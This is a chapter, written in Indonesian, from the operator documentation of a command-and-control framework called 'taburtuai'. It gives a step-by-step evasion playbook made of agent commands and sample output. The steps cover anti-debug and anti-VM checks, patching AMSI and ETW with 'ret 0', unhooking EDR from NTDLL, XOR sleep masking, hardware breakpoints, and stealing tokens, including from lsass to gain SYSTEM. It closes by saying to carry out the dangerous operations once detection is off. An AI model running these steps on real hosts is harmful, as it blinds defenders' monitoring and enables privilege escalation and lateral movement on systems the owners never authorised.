# 11 — Evasion

## Urutan Evasion yang Direkomendasikan

Setelah agent pertama kali connect, lakukan ini sebelum operasi apa pun:

```
1. Cek apakah kita di-debug atau di-sandbox
   └─► opsec antidebug <id>
   └─► opsec antivm <id>

2. Patch AMSI agar tidak scan PowerShell/VBA
   └─► bypass amsi <id>

3. Patch ETW agar tidak kirim telemetri ke Windows Event Log
   └─► bypass etw <id>

4. Hapus EDR hooks dari NTDLL
   └─► evasion unhook <id>

5. Aktifkan sleep masking agar memori agent ter-obfuscate saat idle
   └─► evasion sleep <id> --duration 30
```

---

## AMSI Bypass

**AMSI (Antimalware Scan Interface)** adalah framework Windows yang memungkinkan
security product scan konten sebelum dieksekusi — termasuk script PowerShell, VBA,
dan WScript. Dengan patch AMSI, scan ini dinonaktifkan.

### Patch AMSI di Agent Process

```
taburtuai(IP:PORT) › bypass amsi 2703886d --wait
```

```
[+] Patching AmsiScanBuffer in amsi.dll...
[+] AMSI disabled in agent process. PowerShell scripts will not be scanned.
```

### Patch AMSI di Proses Lain (Remote PID)

Berguna kalau ingin menjalankan PowerShell yang berbahaya dari proses tertentu tanpa
dideteksi:

```
# Cari PID PowerShell yang sudah berjalan
process list 2703886d

# Patch AMSI di proses tersebut
bypass amsi 2703886d --pid 5824 --wait
```

### Cara Kerja

Taburtuai menemukan fungsi `AmsiScanBuffer` di `amsi.dll` yang di-load ke proses, lalu
overwrite byte pertama fungsi tersebut dengan `ret 0` (return 0 = clean = no threat).
Setelah ini, semua scan AMSI akan selalu return "tidak berbahaya".

---

## ETW Bypass

**ETW (Event Tracing for Windows)** adalah sistem telemetri Windows yang dipakai EDR
untuk logging aktivitas. Dengan patch ETW, telemetri ini dinonaktifkan.

```
taburtuai(IP:PORT) › bypass etw 2703886d --wait
```

```
[+] Patching EtwEventWrite in ntdll.dll...
[+] ETW telemetry disabled. Events will no longer be reported to EDR.
```

### Apa yang Dibungkam

- Security event logging via ETW provider
- EDR yang subscribe ke ETW events (CrowdStrike, SentinelOne, dll)
- PowerShell ScriptBlock logging
- Process creation events yang dikirim via ETW

### Cara Kerja

Patch byte pertama fungsi `EtwEventWrite` di `ntdll.dll` dengan `ret 0`. Semua panggilan
ke fungsi ini akan langsung return tanpa mengirim event apa pun.

---

## NTDLL Unhooking

EDR memasang **hooks** (detour) di fungsi-fungsi penting di `ntdll.dll` — syscall gateway
utama Windows — untuk memantau dan memblokir operasi berbahaya.

Contoh fungsi yang di-hook EDR:
- `NtAllocateVirtualMemory` (memory allocation)
- `NtCreateThreadEx` (thread creation)
- `NtWriteVirtualMemory` (write to process memory)
- `NtOpenProcess` (process handle)

### Unhook dengan Baca Ulang dari Disk

```
taburtuai(IP:PORT) › evasion unhook 2703886d --wait
```

```
[+] Reading clean ntdll.dll from disk...
[+] Restoring .text section in memory...
[+] 47 hooks removed. NTDLL is clean.
```

### Cara Kerja

1. Baca `ntdll.dll` langsung dari disk (`C:\Windows\System32\ntdll.dll`)
2. Parse PE header untuk menemukan `.text` section
3. Copy `.text` section dari file disk ke `.text` section yang ada di memori
4. Karena disk masih bersih (EDR tidak bisa hook file di disk), semua hook hilang

**Penting:** Lakukan ini SEBELUM injection atau operasi yang mungkin diblokir EDR.

---

## Sleep Obfuscation

Saat agent idle (sleep antar beacon), isi memorinya masih di RAM dan bisa di-scan
oleh memory scanner EDR. Sleep obfuscation mengenkripsi memori agent selama sleep
menggunakan XOR, lalu decrypt kembali sebelum jalan.

```
taburtuai(IP:PORT) › evasion sleep 2703886d --duration 30 --wait
```

```
[+] Initiating obfuscated sleep for 30 seconds...
[+] Memory XOR-encrypted during sleep.
[+] Agent resumed, memory decrypted.
```

### Kapan Berguna

- EDR yang melakukan periodic memory scan
- Memory forensics yang mencari signature di RAM
- Mengurangi footprint saat agent tidak aktif

---

## Hardware Breakpoints (HWBP)

**Hardware breakpoints** menggunakan debug registers CPU (DR0-DR3) untuk mendeteksi
eksekusi atau akses memori ke alamat tertentu. Bisa dipakai untuk:
- Deteksi hook pada fungsi tertentu
- Anti-debugging yang lebih canggih
- Intercept syscall pada level hardware

### Set Hardware Breakpoint

```
taburtuai(IP:PORT) › evasion hwbp set 2703886d --addr 0x7FFE1234 --register 0 --wait
```

```
[+] Hardware breakpoint set at 0x7FFE1234 in DR0.
```

### Hapus Hardware Breakpoint

```
taburtuai(IP:PORT) › evasion hwbp clear 2703886d --register 0 --wait
```

```
[+] Hardware breakpoint cleared from DR0.
```

### Register yang Tersedia

| Register | Kegunaan |
|---|---|
| DR0 | Breakpoint 1 |
| DR1 | Breakpoint 2 |
| DR2 | Breakpoint 3 |
| DR3 | Breakpoint 4 |

---

## Token Manipulation

Windows security model berdasarkan **token** — objek yang berisi privilege dan identity
proses/thread. Dengan steal atau make token, kita bisa impersonate user lain tanpa
mengetahui password.

### List Token

```
taburtuai(IP:PORT) › token list 2703886d
```

```
[+] Token enumeration:

PID    NAME                    TOKEN TYPE    INTEGRITY    PRIVILEGES
------------------------------------------------------------------------
724    lsass.exe               Primary       System       SeDebugPrivilege, ...
1284   MsMpEng.exe             Primary       System       ...
3048   explorer.exe            Primary       Medium       SeChangeNotifyPrivilege, ...
4512   chrome.exe              Primary       Low          ...
```

### Steal Token (Impersonate User Lain)

Ambil token dari proses yang berjalan atas nama user tertentu dan impersonate sebagai
user itu.

```
# Steal token dari LSASS (butuh admin/SeDebugPrivilege)
token steal 2703886d --pid 724 --wait

# Steal token dari explorer.exe user lain
token steal 2703886d --pid 3048 --wait
```

```
[+] Token stolen from PID 724 (lsass.exe / NT AUTHORITY\SYSTEM)
[+] Impersonating: NT AUTHORITY\SYSTEM
[*] Verify with: cmd <id> "whoami"
```

### Buat Token (LogonUser)

Buat token baru menggunakan kredensial yang kamu sudah tahu.

```
token make 2703886d --user john.doe --domain CORP --pass "Password123!" --wait
```

```
[+] LogonUser succeeded for CORP\john.doe
[+] Token created and impersonated.
[*] Verify with: cmd <id> "whoami"
```

**Kapan berguna:** Lateral movement dengan kredensial yang sudah didapat.

### RunAs (Jalankan Perintah sebagai User Lain)

```
token runas 2703886d --user administrator --domain . --pass "Admin123!" \
  --cmd "cmd.exe" --wait
```

### Revert ke Token Asal

```
token revert 2703886d --wait
```

```
[+] Reverted to original token. Current user: DESKTOP-QLPBF95\windows
```

---

## Rangkuman: Urutan Evasion Lengkap

```
# Langkah 1: Pastikan tidak di sandbox/debug environment
opsec antidebug 2703886d --wait
opsec antivm 2703886d --wait

# Langkah 2: Matikan detection mechanism
bypass amsi 2703886d --wait
bypass etw 2703886d --wait

# Langkah 3: Hapus EDR hooks dari NTDLL
evasion unhook 2703886d --wait

# Langkah 4: Aktifkan sleep masking
evasion sleep 2703886d --duration 60 --wait

# Langkah 5: Kalau butuh privilege lebih
token list 2703886d
token steal 2703886d --pid <LSASS_PID> --wait

# Sekarang baru lakukan operasi berbahaya (injection, creds, dll)
```

---

**Selanjutnya:** [12 — Credential Access](12-credentials.md)
